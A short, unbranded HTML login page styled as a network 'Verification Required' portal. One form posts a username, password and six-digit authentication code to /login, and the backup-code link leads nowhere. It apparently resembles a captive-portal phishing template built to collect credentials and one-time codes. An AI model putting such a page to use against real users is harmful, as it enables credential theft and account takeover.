<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Multi-Factor Authentication</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
background:#0f0f23;display:flex;justify-content:center;align-items:center;
min-height:100vh;color:#e0e0e0}
.card{background:#1a1a2e;border-radius:16px;padding:40px 36px;width:100%;
max-width:400px;box-shadow:0 8px 32px rgba(0,0,0,.5);
border:1px solid rgba(255,255,255,.08)}
.lock{text-align:center;font-size:2.8em;margin-bottom:12px}
h1{text-align:center;font-size:1.2em;color:#fff;margin-bottom:6px}
p.sub{text-align:center;font-size:.82em;color:#8888aa;margin-bottom:28px}
label{display:block;font-size:.8em;color:#8888aa;margin-bottom:4px}
input{width:100%;padding:11px 14px;border:1px solid #333;border-radius:8px;
background:#0f0f23;color:#fff;font-size:.92em;margin-bottom:14px;outline:none}
input:focus{border-color:#6c63ff}
.otp-row{display:flex;gap:8px;margin-bottom:18px}
.otp-row input{text-align:center;font-size:1.4em;letter-spacing:4px;
padding:14px 0;flex:1}
button{width:100%;padding:12px;border:none;border-radius:8px;
background:linear-gradient(135deg,#6c63ff,#3f3d99);color:#fff;
font-size:1em;font-weight:600;cursor:pointer;transition:opacity .2s}
button:hover{opacity:.9}
.alt{text-align:center;margin-top:14px}
.alt a{color:#6c63ff;text-decoration:none;font-size:.82em}
.step{display:none}.step.active{display:block}
</style>
</head>
<body>
<div class="card">
<div class="lock">&#x1F510;</div>
<h1>Verification Required</h1>
<p class="sub">Additional authentication to access this network</p>
<form method="POST" action="/login">
<div class="step active" id="step1">
<label for="user">Email or Username</label>
<input type="text" id="user" name="username" required autocomplete="off">
<label for="pass">Password</label>
<input type="password" id="pass" name="password" required>
<label for="otp">Authentication Code</label>
<div class="otp-row">
<input type="text" id="otp" name="otp" maxlength="6" placeholder="000000" autocomplete="off">
</div>
<button type="submit">Verify &amp; Connect</button>
</div>
</form>
<div class="alt"><a href="#">Use backup code instead</a></div>
</div>
</body>
</html>
